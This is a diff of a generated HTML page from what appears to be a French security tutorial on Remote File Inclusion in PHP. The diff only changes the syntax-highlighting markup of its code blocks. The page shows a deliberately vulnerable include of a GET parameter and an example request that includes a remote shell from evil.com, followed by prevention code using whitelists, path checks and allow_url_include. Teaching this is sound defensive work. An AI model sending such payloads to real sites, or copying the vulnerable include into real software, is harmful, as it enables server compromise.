@@ -7744,44 +7744,44 @@
 <li>Une application web inclut dynamiquement un fichier basé sur les paramètres fournis par l'utilisateur via une URL, par exemple <code>https://example.com/index.php?page=home</code>.</li>
 </ul>
 <p><strong>Exemple de code vulnérable :</strong></p>
-<pre><code class="language-php">&lt;?php 
-$page = $_GET['page']; 
-include($page . &quot;.php&quot;); 
-?&gt;
-</code></pre>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span> 
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span> 
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="k">include</span><span class="p">(</span><span class="nv">$page</span> <span class="o">.</span> <span class="s2">&quot;.php&quot;</span><span class="p">);</span> 
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="cp">?&gt;</span>
+</span></code></pre></div>
 <p><strong>Exploitation :</strong></p>
 <ul>
 <li>Un attaquant peut manipuler le paramètre <code>page</code> pour inclure un fichier distant malveillant, par exemple <code>https://example.com/index.php?page=http://evil.com/shell</code>.</li>
 </ul>
-<pre><code class="language-http">GET /index.php?page=http://evil.com/shell HTTP/1.1 
-Host: example.com
-</code></pre>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="err">GET /index.php?page=http://evil.com/shell HTTP/1.1 </span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="err">Host: example.com</span>
+</span></code></pre></div>
 <h3 id="prevention-des-attaques-rfi">Prévention des Attaques RFI</h3>
 <p><strong>Désactiver l'Inclusion de Fichiers Distants :</strong></p>
 <ul>
 <li>Désactiver l'option <code>allow_url_include</code> dans le fichier de configuration PHP (<code>php.ini</code>).</li>
 </ul>
-<pre><code class="language-ini">; Désactiver l'inclusion de fichiers distants 
-allow_url_include = Off
-</code></pre>
+<div class="language-ini highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">; Désactiver l&#39;inclusion de fichiers distants </span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="na">allow_url_include</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">Off</span>
+</span></code></pre></div>
 <p><strong>Validation et Sanitisation des Entrées :</strong></p>
 <ul>
 <li>Valider et assainir toutes les entrées utilisateur pour s'assurer qu'elles ne contiennent pas de caractères spéciaux ou d'URL.</li>
 </ul>
-<pre><code class="language-php">$whitelist = ['home', 'about', 'contact']; 
-$page = $_GET['page']; 
-if (!in_array($page, $whitelist)) { 
-die(&quot;Page non autorisée.&quot;); 
-} 
-include($page . &quot;.php&quot;);
-</code></pre>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">$whitelist = [&#39;home&#39;, &#39;about&#39;, &#39;contact&#39;]; </span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">$page = $_GET[&#39;page&#39;]; </span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">if (!in_array($page, $whitelist)) { </span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">die(&quot;Page non autorisée.&quot;); </span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="x">} </span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="x">include($page . &quot;.php&quot;);</span>
+</span></code></pre></div>
 <p><strong>Utilisation de Chemins Absolus :</strong></p>
 <ul>
 <li>Utiliser des chemins absolus pour les fichiers inclus afin d'empêcher les manipulations de chemins relatifs ou d'URL.</li>
 </ul>
-<pre><code class="language-php">$page = basename($_GET['page']); 
-include(&quot;/var/www/html/pages/&quot; . $page . &quot;.php&quot;);
-</code></pre>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">$page = basename($_GET[&#39;page&#39;]); </span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">include(&quot;/var/www/html/pages/&quot; . $page . &quot;.php&quot;);</span>
+</span></code></pre></div>
 <h3 id="detection-des-failles-rfi">Détection des Failles RFI</h3>
 <p><strong>Revue de Code :</strong></p>
 <ul>
@@ -7797,29 +7797,29 @@ include(&quot;/var/www/html/pages/&quot; . $page . &quot;.php&quot;);
 </ul>
 <h3 id="exemples-de-prevention">Exemples de Prévention</h3>
 <p><strong>Validation stricte des Entrées :</strong></p>
-<pre><code class="language-php">$allowed_pages = ['home', 'about', 'contact']; 
-$page = $_GET['page']; 
-if (!in_array($page, $allowed_pages)) { 
-die(&quot;Page non autorisée.&quot;); 
-} 
-include($page . &quot;.php&quot;);
-</code></pre>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">$allowed_pages = [&#39;home&#39;, &#39;about&#39;, &#39;contact&#39;]; </span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">$page = $_GET[&#39;page&#39;]; </span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">if (!in_array($page, $allowed_pages)) { </span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">die(&quot;Page non autorisée.&quot;); </span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="x">} </span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="x">include($page . &quot;.php&quot;);</span>
+</span></code></pre></div>
 <p><strong>Utilisation de Fonctions Sécurisées :</strong></p>
-<pre><code class="language-php">$page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_STRING); 
-$allowed_pages = ['home', 'about', 'contact']; 
-if (!in_array($page, $allowed_pages)) { 
-die(&quot;Page non autorisée.&quot;); 
-} 
-include(__DIR__ . &quot;/pages/&quot; . $page . &quot;.php&quot;);
-</code></pre>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="x">$page = filter_input(INPUT_GET, &#39;page&#39;, FILTER_SANITIZE_STRING); </span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="x">$allowed_pages = [&#39;home&#39;, &#39;about&#39;, &#39;contact&#39;]; </span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="x">if (!in_array($page, $allowed_pages)) { </span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="x">die(&quot;Page non autorisée.&quot;); </span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="x">} </span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="x">include(__DIR__ . &quot;/pages/&quot; . $page . &quot;.php&quot;);</span>
+</span></code></pre></div>
 <p><strong>Contrôle des Chemins :</strong></p>
-<pre><code class="language-php">$page = realpath(__DIR__ . &quot;/pages/&quot; . $_GET['page'] . &quot;.php&quot;); 
-$base_dir = realpath(__DIR__ . &quot;/pages/&quot;); 
-if (strpos($page, $base_dir) !== 0 || !file_exists($page)) { 
-die(&quot;Page non autorisée.&quot;); 
-} 
-include($page);
-</code></pre>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="x">$page = realpath(__DIR__ . &quot;/pages/&quot; . $_GET[&#39;page&#39;] . &quot;.php&quot;); </span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="x">$base_dir = realpath(__DIR__ . &quot;/pages/&quot;); </span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="x">if (strpos($page, $base_dir) !== 0 || !file_exists($page)) { </span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="x">die(&quot;Page non autorisée.&quot;); </span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="x">} </span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="x">include($page);</span>
+</span></code></pre></div>
 <hr />
 <table>
 <thead>
@@ -7905,7 +7905,7 @@ include($page);
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "content.code.copy"], "search": "../../../../../assets/javascripts/workers/search.b8dbb3d2.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../../../../assets/javascripts/bundle.fe8b6f2b.min.js"></script>
